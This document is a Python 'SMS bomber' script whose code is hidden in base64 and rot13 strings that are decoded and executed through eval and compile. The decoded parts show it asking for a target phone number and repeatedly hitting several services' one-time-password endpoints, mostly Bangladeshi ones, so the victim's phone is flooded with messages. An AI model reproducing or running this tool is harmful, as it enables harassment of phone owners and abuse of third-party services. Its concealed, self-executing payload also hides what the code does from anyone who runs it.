#Normal sms bombings
 

import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGltZQpmcm9tIHJlcXVlc3RzLnN0cnVjdHVyZXMgaW1wb3J0IENhc2VJbnNlbnNpdGl2ZURpY3QKCiNDVkFMVUUKYmx1ZT0gJ1wzM1s5NG0nCmxpZ2h0Ymx1ZSA9ICdcMDMzWzk0bScKcmVkID0gJ1wwMzNbOTFtJwp3aGl0ZSA9ICdcMzNbOTdtJwp1Z3JlZW49IlwwMzNbNDszMm0iCnllbGxvdyA9ICdcMzNbOTNtJwpncmVlbiA9ICdcMDMzWzE7MzJtJwpjeWFuICA9ICJcMDMzWzk2bSIKZW5kID0gJ1wwMzNbMG0nCmxpbmU9Z3JlZW4rIuKWrCIqMTAwCnNwYWNlPSIgIgpsb2dvPXJlZCtzdHIoIiIiICAgICAgICDilojilojilojilojilojilojilojilZfilojilojilZcgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilojilZfilojilojilZcgIOKWiOKWiOKVlyAgICAKICAgICAgICDilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVkSDilojilojilZTilZ0gXDMzWzkzbSAgIAogICAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4pWU4pWdICAgICAKICAgICAgICDilZrilZDilZDilZDilZDilojilojilZHilojilojilZTilZDilZDilojilojilZHilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilZ0gIOKWiOKWiOKVlOKVkOKWiOKWiOKVlyAgICAgCiAgXDMzWzE7MzJtICAgICAg4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWXICAgIAogICAgICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVnSAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIiIitlbmQpCgogICAgICAKICNIRUFERVIgICAgICAgICAgICAgICAgCnRleHQ9Ilx0XHRcdCIrY'
love = 'zk1MFfv4cvtH01GVRWioJWyphXLbPNvX2A5LJ4eVvNvVykhKT5pqSk0ETI2MJkipTIxVRW5ByAbLJWvnKVtHzSboJShKT4vVNcho3EcL2H9VvVtVPNtVNcxMJLtnTIuMTIlXPx6PtyjpzyhqPufo2qiXDbWpUWcoaDbqTI4qPxXPKOlnJ50XTkcozHcPtyjpzyhqPuho3EcL2HcPvAGEHkSD1EsGHSWGtbWPtbwGHSWGy9HG09ZPz9mYaA5p3EyoFtaL2kyLKVaXDc0qQ0kPaqbnJkyVUE0CQV6PtxWo3Zhp3ymqTIgXPqwoTIupvpcPtxWnTIuMTIlXPxXPDyhqJ1vMKV9p3ElXTyhpUI0XUyyoTkiqlfvKT5povOoCy0tEJ50MKVtITuyVPOBqJ1vMKVtBvNvX2qlMJIhXFxXPDyuoJ1iqJ50CJyhqPucoaO1qPu5MJkfo3peVykhVSf+KFOSoaEypvOHnTHtDJ1go3IhqPN6VPVeM3WyMJ4cXDbWPJ9mYaA5p3EyoFtaL2kyLKVaXDbWPJ5iqTywMG1voUIyXlWpoyk0VPNtVSivtXWqVRWioJWcozptnJ4tpUWiM3Wyp3ZhYv4hYv5poykhVvgyozDXPDybMJSxMKVbXDbWPJSgoJ91oaDlCGRXPDy0o3EuoUAyoaD9ZNbWPKEiqTSfoz90p2IhqQ0jPtxWq2ucoTHtLJ1go3IhqQV8LJ1go3IhqPfkBtbWPDy0pax6PtxWPDycMvNvZQRjVvOcovOhqJ1vMKVto3VtVwNkZPVtnJ4toaIgLzIlBtbWPDxWPKV9pzIkqJImqUZhpT9mqPtvnUE0pUZ6Yl9up3AyqTkcqTIupTxhLzShM2kuoTyhnl5hMKDiLKOcY3LkY3ImMKVio3EjYJkiM2yhY3WypKIyp3DvYTEuqTR9rlWgo2WcoTHvBz51oJWypa0cPtxWPDxWPDbWPDxWMJkmMGbXPDxWPDy1pzjkVQ0tVzu0qUOmBv8ip3ZhLzyhM2HhLaI6rv9iqUNip2IhMP9fo2qcovVXPDxWPDybMJSxMKWmZFN9D2SmMHyhp2Ihp2y0nKMyETywqPtcPtxWPDxWnTIuMTIlpmSoVxAioaEyoaDgIUyjMFWqVQ0tVzSjpTkcL2S0nJ9hY3tgq3q3YJMipz0gqKWfMJ5wo2EyMPVXPDxWPDyxLKEuZFN9VPWjnT9hMG0vX251oJWyptbWPDxWPKWyp3NkVQ0tpzIkqJImqUZhpT9mqPu1pzjkYPObMJSxMKWmCJuyLJEypaZkYPOxLKEuCJEuqTRkXDbWPDxWPKIloQVtCFWbqUEjpmbiY2SjnF5xLJg0LKWvnTScYzAioF9upTxiqwVio3EjY2qyozIlLKEyCm0zLKOcK2gyrG1PIHMKFHATE0qBFHkAH0kWJIIJFPMupTysp2IwpzI0CIqnEH5CGH1XHR9YFSyCGHcGHR9UJx5OE01DDHInER1ZGyMLE01HIxHzoJ9vnJkyCFHlDwt4VvghqJ1vMKVeVvMjoTS0Mz9loG1upUNzLJA0nKMcqUx9oT9anJ4vPtxWPDxWnTIuMTIlpm'
god = 'IgPUNhc2VJbnNlbnNpdGl2ZURpY3QoKQoJCQkJCWhlYWRlcnMyWyJDb250ZW50LVR5cGUiXSA9ICJhcHBsaWNhdGlvbi9qc29uIgoJCQkJCWhlYWRlcnMyWyJDb250ZW50LUxlbmd0aCJdID0gIjAiCgkJCQkJcmVzcDIgPSByZXF1ZXN0cy5wb3N0KHVybDIsIGhlYWRlcnM9aGVhZGVyczIpCgkJCQkJdXJsMyA9ICJodHRwczovL3N0YWdlLmJpb3Njb3BlbGl2ZS5jb20vZW4vbG9naW4vc2VuZC1vdHA/cGhvbmU9ODgiK251bWJlcisiJm9wZXJhdG9yPWJkLW90cCIKCQkJCQlyZXNwMyA9IHJlcXVlc3RzLmdldCh1cmwzKQoJCQkJCXVybDQgPSAiaHR0cHM6Ly94cmlkZXMuc2hvaG96LmNvbS9hcGkvdjIvdXNlci9zZW5kLW1vYmlsZS12ZXJpZmljYXRpb24tY29kZSIKCQkJCQloZWFkZXJzNCA9Q2FzZUluc2Vuc2l0aXZlRGljdCgpCgkJCQkJaGVhZGVyczRbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iCgkJCQkJZGF0YTQgPSAne1wibW9iaWxlXCI6XCInK251bWJlcisnXCJ9JwoJCQkJCXJlc3A0ID0gcmVxdWVzdHMucG9zdCh1cmw0LGhlYWRlcnM9aGVhZGVyczQsZGF0YT1kYXRhNCkKCQkJCQl1cmw1ID0gImh0dHBzOi8vYWRkYWJhamkubW9iaS90d29jdXBzLXYxLXJvYmkvb3RwLnBocCIKCQkJCQloZWFkZXJzNSA9Q2FzZUluc2Vuc2l0aXZlRGljdCgpCgkJCQkJaGVhZGVyczVbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIKCQkJCQlkYXRhNSA9ICJtc2lzZG49IitudW1iZXIKCQkJCQlyZXNwNSA9IHJlcXVlc3RzLnBvc3QodXJsNSwgaGVhZGVycz1oZWFkZXJzNSwgZGF0YT1kYXRhNSkKCQkJCQl1cmw2ID0gImh0dHBzOi8vZGV2ZWxvcGVyLnF1aXpnaXJpLnh5ei9hcGkvdjIuMC9zZW5kLW90cCIKCQkJCQloZWFkZXJzNiA9Q2FzZUluc2Vuc2l0aXZlRGljdCgpCgkJCQkJaGVhZGVyczZbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iCgkJCQkJZGF0YTYgPSAneyJwaG9uZSI6IicrbnVtYmVyKyciLCJjb3VudHJ5X2NvZGUiOiIrODgwIiwiZmNtX3Rva2VuIjpudWxsfScKCQkJCQlyZXNwNj0gcmVxdWVzdHMucG9zdCh1cmw2LCBoZWFkZXJzPWhlYWRlcnM2LCBkYXRhPWRhdGE2KQoJCQkKCQkJCQkJCQkJCQkJCgkJCQlpZiBhbW1vdW50Mj09MToKCQkJCQlwcmludCh5ZWxsb3crIlxuXHQgIFNIUkVLPT0'
destiny = '+VPNtVvgapzIyovfvJ+XpyS0tZKA0VSAAHlOGMJ50YvVcPtxWPDyyoTyzVTSgoJ91oaDlCG0lBtbWPDxWPKOlnJ50XUyyoTkiqlfvKT5pqPNtH0uFEHf9CG4tVPNvX2qlMJIhXlWo4clHKFNlozDtH01GVSAyoaDhVvxXPDxWPJIfnJLtLJ1go3IhqQV9CGZ6PtxWPDxWpUWcoaDbrJIfoT93XlWpoyk0VPOGFSWSFm09CvNtVPVeM3WyMJ4eVyivaWEqVQAlMPOGGIZtH2IhqP4vXDbWPDxWMJkmMGbXPDxWPDyjpzyhqPu5MJkfo3peVykhKUDtVSAVHxIYCG0+VPNtVvgapzIyovfvJ+XpyS0tVvgmqUVbLJ1go3IhqQVcXlW0nPOGGIZtH2IhqP4vXDbWPDxWqTygMF5moTIypPtkXDbWPDxWqT90LJkmMJ50Xm0kPtxWPDyuoJ1iqJ50Zvf9ZDbWPDyyrTAypUD6PtxWPDycMvOuoJ1iqJ50Zw09ZGbXPDxWPDyjpzyhqPu5MJkfo3peVykhKUDtVSAVHxIYCG0+VPNtVvglMJDeVyivaWMqVQSmqPOGGIZtGz90VSAyoaDhVvxXPDxWPJIfnJLtLJ1go3IhqQV9CGV6PtxWPDxWpUWcoaDbrJIfoT93XlWpoyk0VPOGFSWSFm09CvNtVPVepzIxXlWo4clJKFNlozDtH01GVR5iqPOGMJ50YvVcPtxWPDyyoTyzVTSgoJ91oaDlCG0mBtbWPDxWPKOlnJ50XUyyoTkiqlfvKT5pqPNtH0uFEHf9CG4tVPNvX3WyMPfvJ+Xpyy0tZ3WxVSAAHlOBo3DtH2IhqP4vXDbWPDxWMJkmMGbXPDxWPDyjpzyhqPu5MJkfo3peVykhKUDtVSAVHxIYCG0+VPNtVvglMJDeVyivaWMqVPVep3ElXTSgoJ91oaDlXFfvqTttH01GVR5iqPOGMJ50YvVcPtxWPDxWqTygMF5moTIypPtmXDbWPDxWPJSgoJ91oaDlXm0kPtxWPDxWPDxWPDbWPDxWPDxWPDbWPKEiqTSfnTy0CJSgoJ91oaDlYGRXPDy0o3EuoT5iqUAyoaD9qT90LJkbnKDgqT90LJkmMJ50PtxWpUWcoaDbLzk1MFfvKT5poyk0KUEo4bPvKFOHo3EuoPOVnKEmVQbtVvgmqUVbqT90LJkbnKDcXDbWPKOlnJ50XTqlMJIhXlWpoyk0KUEo4clGKFOHo3EuoPOGMJ50VQbtVvgmqUVbqT90LJkmMJ50XFxXPDyjpzyhqPulMJDeVykhKUEpqSivaWMqVSEiqTSfVR5iqPOGMJ50VQbtVvgmqUVbqT90LJkho3EmMJ50XFfvKT4vXDbWPJkup3E0CKA0pvucoaO1qPuapzIyovfvKT5poyk0KUDtVSivaWAqVRSfoPORo25yVIkhKUDtJ+XNby0tGz93VSOlMKAmVRIhqTIlVRgyrFOHolOALJyhVT1yoaHtKT4vXFxXPDy0nJ1yYaAfMJIjXQRcPtxWqUD9ZjbWPJ9mYaA5p3EyoFtvpUy0nT9hVT1unJ4hpUxvXDbWPDb='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
